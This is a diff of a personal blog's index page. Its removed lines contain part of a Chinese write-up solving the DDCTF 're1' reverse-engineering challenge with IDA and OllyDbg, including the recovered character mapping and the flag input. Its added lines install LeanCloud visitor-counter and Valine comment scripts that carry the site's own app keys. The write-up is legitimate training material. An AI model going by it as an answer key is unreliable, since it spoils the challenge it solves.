- v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(<span class="keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>…我发觉a1 - v1这是什么鬼，a1不是地址吗，v1又是什么鬼。。抱着一堆什么鬼都不知道的东西，我就直接上od了，因为这是windows逆向，所以我还是比较擅长动态调试的，大一一年几乎都是在啃汇编啃od,当时都不知道ida这玩意。</p>
-<p>调试环境：吾爱虚拟机</p>
-<p>工具：吾爱的OD</p>
-<p>感觉像是为吾爱打了一波广告，哈哈，没关系，反正我也是论坛成员，宣传下没什么毛病<br>打开od载入程序后，点播放按钮，也就是运行按钮，然后右键中文搜索，搜索字符串，来到这里</p>
-<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blu5vzhij319y0jgmxw.jpg" alt="2"></p>
-<p>在定位到关键点please input code<br>这里很容易看出ida的逻辑，scanf后跟着的一个call便是关键，在此call处下断点，</p>
-<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blucw5inj31hc0sj77u.jpg" alt="3"></p>
-<p>然后输入12345678,</p>
-<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blui7pb2j31hc0sj77t.jpg" alt="4"></p>
-<p>成功断下，然后F7单步进入,在单步跟了一轮过后，我发觉pop这里有好东西<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blunfdy7j31hc0sjtc5.jpg" alt="6"><br>看堆栈窗口，也就是右下角，出现了跟我输入字符串一样长度的英文字符串，起初我也没在意，然后输入多几次后发觉，每次输入是对应的，也就是说，他跟凯撒密码类似，他只是移了下位，然后，我自己手动把键盘里所有出现的字符输入了一遍，发觉还是漏了一些，找不齐，最终就利用他本身含有的一个字符串进行输入，得到每个的对应字符串，他的字符串可以从od里直接看到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluu4xyaj31hc0sj77l.jpg" alt="7"><br>或者从ida里都可以找到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluykzzgj30wi04pq3x.jpg" alt="8"><br>然后进行手动输入进行匹配，我需要的DDCTF{reverse}<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv2f2a7j31hc0sjwi3.jpg" alt="9"><br>看栈窗口，最上面的对应匹配，我这样手动把每个字符对应起来，就得到flag了<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv7l7y4j31hc0sjwi2.jpg" alt="10"><br>最终得到对应字符<br>Z D<br>[ C<br>J T<br>, r<br>9 e<br>( v</p>
-<ul>
-<li>s<h1 id=""><a href="#" class="headerlink" title="{"></a>{</h1>! }<br>X F</li>
-</ul>
-<p>手动得到ZZ[JX#,9(9,+9!</p>
-
+          <h1 id="DDCTF之re1详解"><a href="#DDCTF之re1详解" class="headerlink" title="DDCTF之re1详解"></a>DDCTF之re1详解</h1><p>前言：re1,可能我的是非预期解法吧，re2的话，可能也是非预期吧，不过做出来过后感觉这两道都蛮简单的，不会做的时候就是个傻子。。。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>用ida打开这个程序，出现upx1,明显upx壳，linux下我用upx -d filename 脱了壳后。我先把ida出来的flag复制提交了下，没用。。。然后开始看算法，</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/19/ddctf-re1-2/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1282,7 +1340,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/base/" class="post-meta-item leancloud_visitors" data-flag-title="基础待补充" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/base/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/base/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -1385,7 +1464,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1439,6 +1518,103 @@
 
 
 
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
+            'X-LC-Key': 'C1z9X6NQu0ES8qiAOF8RaSq3',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
 
 
 
@@ -1465,6 +1641,8 @@
 
 
 
+  <script src="/js/local-search.js"></script>
+
 
 
 
@@ -1480,6 +1658,33 @@
   
 
   
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
+    appKey: 'C1z9X6NQu0ES8qiAOF8RaSq3',
+    placeholder: "Just go go",
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: false,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
 
 </body>
 </html>
